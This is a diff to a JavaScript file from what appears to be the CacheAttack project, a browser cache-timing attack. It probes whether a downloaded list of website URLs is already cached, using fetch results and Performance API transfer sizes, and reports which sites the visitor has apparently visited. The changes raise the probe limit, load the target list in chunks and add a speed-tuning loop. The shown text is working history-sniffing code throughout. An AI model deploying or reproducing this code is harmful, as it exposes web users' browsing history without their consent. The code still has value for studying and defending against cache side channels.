@@ -1,9 +1,41 @@
 /*jshint esversion: 8 */
 
 // NDev 2020 https://github.com/NDevTK/CacheAttack
-max = 10;
+max = 120;
 let firefox = navigator.userAgent.includes("Firefox");
 ifCached = (navigator.userAgent.includes("Firefox")) ? ifCached_1Wrap : ifCached_2;
+
+async function getRules() {
+    let req = await fetch("https://cache.ndev.tk/rules");
+    let body = await req.json();  
+    return chunk(body, 100);
+}
+
+function chunk(arr, size){
+  let chunked = [];
+  for(let ele of arr){
+    let last = chunked[chunked.length - 1]
+    if(!last || last.length === size){
+      chunked.push([ele])
+    } else {
+      last.push(ele)
+    }
+  }
+  return chunked
+}
+
+async function speedTest() {
+    var url = "https://ndev.tk/README.md?test=" + Math.random();
+    await fetch(url);
+    var i = 0
+    while (true) {
+        i += 1;
+        let result = await ifCached(url);
+        if (!result) return console.info(i);
+        let result2 = await ifCached("https://ndev.tk/README.md?test=" + Math.random());
+        if(result2) return console.info(i);
+    }
+}
 
 function is304(res) {
     if (res.encodedBodySize > 0 &&
@@ -14,23 +46,17 @@ function is304(res) {
     return null;
 }
 
-async function PromiseForeach(item, callback) {
-  var jobs = [];
-  item.forEach((value, key) => jobs.push(callback(key, value)));
-  await Promise.all(jobs);
-}
-
-async function getRules() {
-    let req = await fetch("https://cache.ndev.tk/rules");
-    let body = await req.json();  
-    return new Map(body);
-}
-
 function PerformanceCheck(url) {
     var res = performance.getEntriesByName(url).pop();
     if(res === undefined) return null;
     if(is304(res)) return true;
     return (res.transferSize === 0);
+}
+
+async function PromiseForeach(item, callback) {
+  var jobs = [];
+  item.forEach(value => jobs.push(callback(value)));
+  await Promise.all(jobs);
 }
 
 async function getWebsites(cb, CacheTest = true, performanceCheck = true) {
@@ -44,14 +70,16 @@ async function getWebsites(cb, CacheTest = true, performanceCheck = true) {
         if(!TestResult) throw "Cache is not working :-(";
     }
     // Foreach website check if cached
-    await PromiseForeach(Websites, async (url, name) => {
-        let check = null;
-        let result = await ifCached(url);
-        if(performanceCheck === true) check = PerformanceCheck(url);		
-        if(check || result && check === null) {
-	    callback(name);
-        }
-    });
+    for (let chunk of Websites) {
+	await PromiseForeach(chunk, async website => {
+		let check = null;
+		let result = await ifCached(website[0]);
+		if(performanceCheck === true) check = PerformanceCheck(website[0]);		
+		if(check || result && check === null) {
+			callback(website[1]);
+		}
+	});
+    }
     return output;
 }
 
